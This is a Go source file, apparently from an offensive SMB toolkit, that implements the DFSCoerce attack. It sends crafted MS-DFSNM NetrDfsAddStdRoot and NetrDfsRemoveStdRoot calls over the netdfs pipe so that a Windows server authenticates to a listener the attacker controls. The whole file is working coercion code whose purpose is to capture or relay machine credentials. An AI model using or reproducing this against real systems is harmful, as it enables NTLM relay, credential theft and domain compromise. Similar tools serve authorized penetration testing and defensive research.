package coerce

import (
	"context"

	"github.com/ineffectivecoder/SMBGooser/pkg/dcerpc"
)

// DFSCoerce implements MS-DFSNM coercion
type DFSCoerce struct{}

// NewDFSCoerce creates a DFSCoerce coercer
func NewDFSCoerce() *DFSCoerce {
	return &DFSCoerce{}
}

func (d *DFSCoerce) Name() string {
	return "DFSCoerce"
}

func (d *DFSCoerce) Description() string {
	return "MS-DFSNM (DFS Namespace Management) - NetrDfsAddStdRoot and related"
}

func (d *DFSCoerce) PipeName() string {
	return "netdfs"
}

func (d *DFSCoerce) InterfaceUUID() dcerpc.UUID {
	return dcerpc.DFSNM_UUID
}

func (d *DFSCoerce) InterfaceVersion() uint32 {
	return 3
}

func (d *DFSCoerce) Opnums() []OpnumInfo {
	return []OpnumInfo{
		{12, "NetrDfsAddStdRoot", "Add DFS root - triggers UNC access"},
		{13, "NetrDfsRemoveStdRoot", "Remove DFS root - triggers UNC access"},
	}
}

func (d *DFSCoerce) Coerce(ctx context.Context, rpc *dcerpc.Client, listener string, opts CoerceOptions) error {
	opnums := d.getOpnums(opts)
	path := buildCallbackPath(listener, opts.UseHTTP, opts.HTTPPort)

	var lastErr error
	for _, opnum := range opnums {
		stub := d.createStub(path, opnum.Opnum)
		_, err := rpc.Call(opnum.Opnum, stub)

		if err != nil {
			if isCoercionSuccess(err) {
				return nil
			}
			lastErr = err
			continue
		}
		return nil
	}

	return lastErr
}

func (d *DFSCoerce) getOpnums(opts CoerceOptions) []OpnumInfo {
	if opts.SpecificOpnum >= 0 {
		for _, op := range d.Opnums() {
			if op.Opnum == uint16(opts.SpecificOpnum) {
				return []OpnumInfo{op}
			}
		}
	}
	return d.Opnums()
}

// createStub creates NDR stub for DFS functions
func (d *DFSCoerce) createStub(path string, opnum uint16) []byte {
	w := dcerpc.NewNDRWriter()

	switch opnum {
	case 12: // NetrDfsAddStdRoot
		// ServerName (conformant varying string)
		w.WriteUnicodeString(path)
		// RootShare
		w.WriteUnicodeString("share")
		// Comment
		w.WriteUnicodeString("")
		// ApiFlags
		w.WriteUint32(0)

	case 13: // NetrDfsRemoveStdRoot
		// ServerName
		w.WriteUnicodeString(path)
		// RootShare
		w.WriteUnicodeString("share")
		// ApiFlags
		w.WriteUint32(0)
	}

	return w.Bytes()
}
